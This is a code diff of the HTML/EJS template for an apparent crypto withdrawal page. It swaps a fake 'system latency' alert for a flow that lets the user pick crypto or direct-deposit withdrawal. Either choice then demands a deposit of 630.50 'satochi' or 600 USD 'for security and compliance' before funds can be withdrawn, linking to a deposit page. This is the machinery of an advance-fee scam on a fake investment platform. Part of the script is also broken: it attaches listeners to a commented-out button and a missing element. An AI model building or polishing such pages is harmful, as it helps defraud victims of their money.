@@ -7,8 +7,58 @@
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-gray-900 min-h-screen flex justify-center items-center">
-  <!-- Page Content -->
-  <div class="w-full max-w-md bg-white shadow-lg rounded-lg p-6">
+  <!-- Initial Modal -->
+  <div
+    id="withdrawal-method-modal"
+    class="fixed inset-0 bg-gray-900 bg-opacity-50 flex items-center justify-center z-50"
+  >
+    <div class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm">
+      <h2 class="text-xl font-bold text-gray-800 mb-4">Choose Withdrawal Method</h2>
+      <button
+        id="crypto-withdrawal"
+        class="w-full bg-blue-500 text-white font-bold py-2 px-4 rounded-lg hover:bg-blue-600 mb-2"
+      >
+        Crypto Withdrawal
+      </button>
+      <button
+        id="direct-deposit"
+        class="w-full bg-green-500 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-600"
+      >
+        Direct Deposit
+      </button>
+    </div>
+  </div>
+
+  <!-- Follow-up Modal -->
+  <div
+    id="follow-up-modal"
+    class="hidden fixed inset-0 bg-gray-900 bg-opacity-50 flex items-center justify-center z-50"
+  >
+    <div class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm">
+      <h2 class="text-xl font-bold text-gray-800 mb-4">Action Required</h2>
+      <p id="follow-up-text" class="text-gray-700 mb-4">
+        <!-- Dynamic content based on selection -->
+      </p>
+      <!-- <button
+        id="contact-manager"
+        class="w-full bg-red-500 text-white font-bold py-2 px-4 rounded-lg hover:bg-red-600 mb-2"
+      >
+        Contact Account Manager
+      </button> -->
+      <a
+        href="fund/step1?userId=<%= user._id %>"
+        class="w-fit bg-blue-500 text-white font-bold py-2 px-4 rounded-lg hover:bg-blue-600"
+      >
+        Make Deposit
+    </a>
+    </div>
+  </div>
+
+  <!-- Main Page Content -->
+  <div
+    id="main-content"
+    class="hidden w-full max-w-md bg-white shadow-lg rounded-lg p-6"
+  >
     <h1 class="text-2xl font-bold text-gray-800 mb-4">Withdraw Crypto</h1>
     <form>
       <div class="mb-4">
@@ -46,46 +96,39 @@
     </form>
   </div>
 
-  <!-- Warning Modal -->
-  <div
-    id="warning-modal"
-    class="fixed inset-0 bg-gray-900 bg-opacity-50 flex items-center justify-center z-50"
-  >
-    <div class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm">
-      <h2 class="text-xl font-bold text-red-600 mb-4">Alert!</h2>
-      <p class="text-gray-700 mb-4">
-        Due to high demand for withdrawal, the system is experiencing some latency. <br/>
-        Not to worry, we are working to restore it.<br/>
-        Contact your account manager for more info.  
-      </p>
-      <button
-        id="close-modal"
-        class="w-full bg-red-500 text-white font-bold py-2 px-4 rounded-lg hover:bg-red-600"
-      >
-        I Understand
-      </button>
-    </div>
-  </div>
-
   <!-- JavaScript -->
   <script>
     document.addEventListener("DOMContentLoaded", function () {
-      const modal = document.getElementById("warning-modal");
-      const closeModal = document.getElementById("close-modal");
+      const withdrawalMethodModal = document.getElementById("withdrawal-method-modal");
+      const followUpModal = document.getElementById("follow-up-modal");
+      const mainContent = document.getElementById("main-content");
+      const followUpText = document.getElementById("follow-up-text");
 
-      // Extract userId from the URL
-      const urlParams = new URLSearchParams(window.location.search);
-      const userId = urlParams.get("userId");
+      const cryptoWithdrawalBtn = document.getElementById("crypto-withdrawal");
+      const directDepositBtn = document.getElementById("direct-deposit");
+      const contactManagerBtn = document.getElementById("contact-manager");
+      const makeDepositBtn = document.getElementById("make-deposit");
 
-      closeModal.addEventListener("click", function () {
-        modal.style.display = "none";
+      cryptoWithdrawalBtn.addEventListener("click", () => {
+        followUpText.textContent = "For security and compliance purposes, and to ensure the authenticity of withdrawal requests, a deposit of 630.50 satochi is required. This process verifies account ownership and maintains system integrity. Please proceed with the deposit to continue your withdrawal request. If you have questions, contact your account manager or support team for further assistance.";
+        withdrawalMethodModal.style.display = "none";
+        followUpModal.style.display = "flex";
+      });
 
-        if (userId) {
-          // Redirect with the dynamic userId
-          window.location.href = `/dashboard?userId=${userId}#`;
-        } else {
-          console.error("userId not found in the URL.");
-        }
+      directDepositBtn.addEventListener("click", () => {
+        followUpText.textContent = "For security and compliance purposes, and to ensure the authenticity of withdrawal requests, a deposit of 600 USD is required. This process verifies account ownership and maintains system integrity. Please proceed with the deposit to continue your withdrawal request. If you have questions, contact your account manager or support team for further assistance.";
+        withdrawalMethodModal.style.display = "none";
+        followUpModal.style.display = "flex";
+      });
+
+      contactManagerBtn.addEventListener("click", () => {
+        alert("Redirecting to contact page...");
+        // Redirect or additional logic for contacting the manager
+      });
+
+      makeDepositBtn.addEventListener("click", () => {
+        followUpModal.style.display = "none";
+        mainContent.style.display = "block";
       });
     });
   </script>
